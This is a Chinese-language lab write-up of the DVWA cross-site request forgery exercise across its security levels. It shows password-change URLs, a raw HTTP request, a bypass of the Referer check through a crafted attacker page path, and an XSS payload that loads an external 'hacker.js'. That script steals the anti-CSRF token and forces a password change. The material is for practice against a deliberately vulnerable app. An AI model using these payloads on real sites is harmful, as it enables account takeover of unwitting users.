# DVWA-CSRF



# low 


修改密碼 123 的請求
```
http://dvwa.com/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change#
```

修改密碼 456 的請求，丟link 給登入的受害者，讓他用以登入瀏覽器跳轉
```
http://dvwa.com/vulnerabilities/csrf/?password_new=456&password_conf=456&Change=Change
```




# medium 

修改123
```http=
GET /vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change HTTP/1.1
Host: dvwa.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://dvwa.com/vulnerabilities/csrf/?password_new=%6012&password_conf=123&Change=Change
Cookie: PHPSESSID=r5nduhuh4vu7emsg296bunmogu; security=medium
Upgrade-Insecure-Requests: 1

```

修改456 無效
```
http://dvwa.com/vulnerabilities/csrf/?password_new=456&password_conf=456&Change=Change
```


- 原因，他判斷更改密碼必須是重同個站內 dvwa.com refer過去的，所以要多一個refer請求。

```php=
 // Checks to see where the request came from
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) { 

```

- stripos 不是很好的過濾方式
```
//查找 "php" 在字符串中第一次出现的位置：

<?php
echo stripos("I love php, I love php too!","PHP");
?>
```


- 開個網站創建網頁，記得路徑一定要有 dvwa.com 的字串
```
http://csrf/dvwa.com.html
```

- a tag 加上 referrerpolicy='unsafe-url'
```
<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>


	<a href="http://dvwa.com/vulnerabilities/csrf/?password_new=111&password_conf=111&Change=Change#" referrerpolicy='unsafe-url' >go</a>

</body>
</html>
```

這是一個很簡單的方式，當然可以做成表單然後JS自動跳轉。





# high


csrf 就是hacker 幫victim 偷偷提交請求。

但開發者通常對於重要請求都會加上TOKEN ，送過來比對。

所以hacker 不知道token 也沒用。

所以這題純粹繞不過，但如果存在 xss 就可以先去向server 請求獲取token，然後再偷偷提交。


xss 我們選 dom high 那題



dom xss 請求csrf high 的頁面抓取token。
然後帶上 token + 修改密碼請求。



xss 請求hacker.js
```link
http://dvwa.com/vulnerabilities/xss_d/?default=English#<script src="http://csrf/hacker.js"></script>
```


### 獲取token + 請求

雖然也可以一次寫，不需要放個外部JS，不過這樣比較美觀


http://csrf/hacker.js

```javascript
async function getToken(url) {

 	let data = await fetch(url);

 	// data 轉為 text
 	data = await data.text();

 	//創造dom 物件
	const parser = new DOMParser();

	//把resoonse資料轉成dom
	const htmlDoc =  parser.parseFromString(data, "text/html");


	//querySelector 抓取 token 
	let token =  htmlDoc.querySelector("input[name=user_token]").value; 

	//回傳token
	return token;

}





async function csrf_send() {

	//拿token
	let url = "http://dvwa.com/vulnerabilities/csrf/";

	let token =  await getToken(url);


    //csrf 
	csrf_url_Request = "http://dvwa.com/vulnerabilities/csrf/?password_new=777&password_conf=777&Change=Change&user_token="

	//加上token 
	csrf_url_Request += token;



	//console.log(csrf_request) ;
	

    //fetch 發出請求
	fetch(csrf_url_Request);

}


csrf_send();

```






# impossible


加上了舊密碼。

